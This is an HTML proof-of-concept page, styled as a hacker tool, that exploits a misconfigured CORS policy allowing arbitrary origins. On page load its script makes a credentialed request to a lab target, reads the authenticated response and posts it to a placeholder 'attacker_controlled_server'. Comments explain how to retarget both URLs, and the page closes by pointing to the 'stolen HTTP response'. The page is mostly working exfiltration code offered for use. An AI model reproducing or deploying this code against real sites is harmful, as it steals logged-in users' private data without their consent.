<html>
<title>--==[[ CORS ]]==--</title>
<STYLE>
body {
    
background-position: center center;
background-repeat: no-repeat;
background-size: 400px 200px;
background-color: #000000;
background-attachment: fixed;
font-family: Tahoma
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: white;
width: 40%;
color: white;
}
input {
border            : solid 2px;
border-color        : #333;
BACKGROUND-COLOR: black;
font: 10pt comic sans ms;
color: white;
}
</STYLE>
<body bgcolor=black>
<div align=center>
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" style="border: dashed 2px #333">
<td width="100%" align=center valign="top" rowspan="1" >
<font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Arbitrary  Origin </font><font color=white size=5 face="comic sans ms"><b> mis-configured </font><font color=green size=5 face="comic sans ms"><b>CORS policy POC ]]==--</font> <div class="hedr">
<td height="10" align="left" class="td1"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="comic sans ms"size="1"><b>
<font color=#ff9933>
################################################</font><font color=white>################################################</font><font color=green>################################################</font><br>
</table>
</table> <div align=center><font size=4 color=white face="comic sans ms"><img src="https://www.technopat.net/sosyal/styles/default/xenforo/smilies/matrix.gif"> --==[[ haxor gonna hack ]]==-- <img src="https://web.archive.org/web/20140704135452/freesmileys.org/smileys/smiley-flag010.gif"></font>
<font color=white size=4 face="comic sans ms">        
<br># - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - # 
<br>
<script>
//Function which will make CORS request to target application web page to grab the HTTP response
function exploit() {
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
     var all = this.responseText;
     exfiltrate(all); // Ghuma de sodda \m/
     
      }
 };
 xhttp.open("GET", "http://indishell.lab/cors-vulnerable-lab/arbitrary_origin.php", true); //change the URL to the one which has mis-configured CORS policy
 xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
 xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 xhttp.withCredentials = true;
 xhttp.send();
}

function exfiltrate(data_all) {
       var xhr = new XMLHttpRequest();
       xhr.open("POST", "http://attacker_controlled_server/", true); //Replace the URL with attacker controlled Server
       
       xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
       xhr.withCredentials = true;
       var body = data_all;//Data which attacker want to exfiltrate
       var aBody = new Uint8Array(body.length);
       for (var i = 0; i < aBody.length; i++)
         aBody[i] = body.charCodeAt(i); 
       xhr.send(new Blob([aBody]));
}

</script>
<body onload="exploit()">
<div align=center style="margin: 10px 20px 20px; word-wrap: break-word;">
Check attacker server for stolen HTTP response 8-)<br> <br>
</body>
</html>
